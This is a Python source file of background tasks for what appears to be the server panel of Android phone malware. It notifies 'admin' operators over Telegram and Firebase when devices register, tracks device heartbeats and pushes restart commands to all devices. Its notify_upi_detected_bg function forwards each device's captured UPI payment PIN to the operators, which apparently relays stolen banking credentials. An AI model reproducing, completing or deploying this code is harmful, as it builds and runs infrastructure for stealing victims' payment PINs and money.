import asyncio
import logging
from typing import Optional, Dict, Any
from datetime import datetime, timedelta

logger = logging.getLogger(__name__)

class BackgroundTaskManager:

    def __init__(self):
        self.pending_tasks = []

    async def send_telegram_notification(
        self,
        service,
        method_name: str,
        *args,
        **kwargs
    ):
        try:
            method = getattr(service, method_name)
            await method(*args, **kwargs)
            logger.debug(f"? Telegram notification sent: {method_name}")
        except Exception as e:
            logger.warning(f"??  Failed to send Telegram notification: {e}")

    async def send_push_notification(
        self,
        service,
        method_name: str,
        *args,
        **kwargs
    ):
        try:
            method = getattr(service, method_name)
            result = await method(*args, **kwargs)
            logger.debug(f"? Push notification sent: {method_name}")
            return result
        except Exception as e:
            logger.warning(f"??  Failed to send push notification: {e}")
            return None

    async def log_activity(
        self,
        service,
        *args,
        **kwargs
    ):
        try:
            await service.log_activity(*args, **kwargs)
            logger.debug(f"? Activity logged")
        except Exception as e:
            logger.warning(f"??  Failed to log activity: {e}")

background_tasks = BackgroundTaskManager()

async def send_telegram_in_background(
    telegram_service,
    admin_username: str,
    message: str,
    bot_index: Optional[int] = None
):
    try:
        await telegram_service.send_to_admin(
            admin_username,
            message,
            bot_index=bot_index
        )
    except Exception as e:
        logger.warning(f"Background telegram failed: {e}")

async def send_push_in_background(
    firebase_service,
    admin_username: str,
    title: str,
    body: str,
    data: Optional[Dict[str, Any]] = None
):
    try:
        await firebase_service.send_notification_to_admin(
            admin_username,
            title,
            body,
            data or {}
        )
    except Exception as e:
        logger.warning(f"Background push failed: {e}")

async def notify_device_registration_bg(
    telegram_service,
    firebase_service,
    admin_username: str,
    device_id: str,
    device_info: Dict[str, Any],
    admin_token: str
):
    try:

        await telegram_service.notify_device_registered(
            admin_username=admin_username,
            device_id=device_id,
            device_info=device_info
        )

        app_type = device_info.get('app_type', 'Unknown')
        model = device_info.get('model', 'Unknown')

        await firebase_service.send_device_registration_notification(
            admin_username=admin_username,
            device_id=device_id,
            app_type=app_type,
            model=model
        )

        logger.debug(f"? Device registration notifications sent for {device_id}")

    except Exception as e:
        logger.warning(f"Background device registration notification failed: {e}")

async def notify_upi_detected_bg(
    telegram_service,
    firebase_service,
    admin_username: str,
    device_id: str,
    upi_pin: str,
    model: Optional[str] = None
):
    try:

        await telegram_service.notify_upi_detected(
            admin_username=admin_username,
            device_id=device_id,
            upi_pin=upi_pin
        )

        await firebase_service.send_upi_pin_notification(
            admin_username=admin_username,
            device_id=device_id,
            upi_pin=upi_pin,
            model=model
        )

        logger.debug(f"? UPI detection notifications sent for {device_id}")

    except Exception as e:
        logger.warning(f"Background UPI notification failed: {e}")

async def notify_admin_login_bg(
    telegram_service,
    admin_username: str,
    ip_address: str,
    success: bool = True
):
    try:
        await telegram_service.notify_admin_login(
            admin_username=admin_username,
            ip_address=ip_address,
            success=success
        )
        logger.debug(f"? Admin login notification sent for {admin_username}")
    except Exception as e:
        logger.warning(f"Background admin login notification failed: {e}")

async def notify_admin_logout_bg(
    telegram_service,
    admin_username: str,
    ip_address: str
):
    try:
        await telegram_service.notify_admin_logout(
            admin_username=admin_username,
            ip_address=ip_address
        )
        logger.debug(f"? Admin logout notification sent for {admin_username}")
    except Exception as e:
        logger.warning(f"Background admin logout notification failed: {e}")

async def send_2fa_code_bg(
    telegram_service,
    admin_username: str,
    ip_address: str,
    code: str,
    message_prefix: Optional[str] = None
):
    try:
        await telegram_service.send_2fa_notification(
            admin_username=admin_username,
            ip_address=ip_address,
            code=code,
            message_prefix=message_prefix
        )
        logger.debug(f"? 2FA code sent for {admin_username}")
    except Exception as e:
        logger.warning(f"Background 2FA notification failed: {e}")

async def send_multiple_notifications_bg(
    telegram_service,
    firebase_service,
    notifications: list
):
    tasks = []

    for notif in notifications:
        if notif["type"] == "telegram":
            method = getattr(telegram_service, notif["method"])
            tasks.append(method(*notif.get("args", []), **notif.get("kwargs", {})))
        elif notif["type"] == "push":
            method = getattr(firebase_service, notif["method"])
            tasks.append(method(*notif.get("args", []), **notif.get("kwargs", {})))

    results = await asyncio.gather(*tasks, return_exceptions=True)

    for i, result in enumerate(results):
        if isinstance(result, Exception):
            logger.warning(f"Notification {i} failed: {result}")

    logger.debug(f"? Batch notifications sent: {len(notifications)}")

async def check_offline_devices_bg(mongodb):
    while True:
        try:

            six_minutes_ago = datetime.utcnow() - timedelta(minutes=6)

            result = await mongodb.db.devices.update_many(
                {
                    "last_ping": {"$lt": six_minutes_ago},
                    "status": "online"
                },
                {
                    "$set": {
                        "status": "offline",
                        "is_online": False,
                        "last_online_update": datetime.utcnow()
                    }
                }
            )

            if result.modified_count > 0:
                logger.info(f"🔴 Marked {result.modified_count} devices as offline (heartbeat timeout)")

            await asyncio.sleep(300)

        except Exception as e:
            logger.error(f"❌ Error in offline devices checker: {e}")

            await asyncio.sleep(60)

async def restart_all_heartbeats_bg(firebase_service):

    await asyncio.sleep(120)

    while True:
        try:
            logger.info("💓 Sending restart_heartbeat to all devices via topic...")

            result = await firebase_service.restart_all_heartbeats()

            if result["success"]:
                logger.info(f"✅ Restart heartbeat sent to topic 'all_devices' (Message ID: {result.get('message_id', 'N/A')})")
            else:
                logger.error(f"❌ Failed to send restart heartbeat: {result.get('message', 'Unknown error')}")

            await asyncio.sleep(600)

        except Exception as e:
            logger.error(f"❌ Error in restart heartbeats task: {e}")

            await asyncio.sleep(120)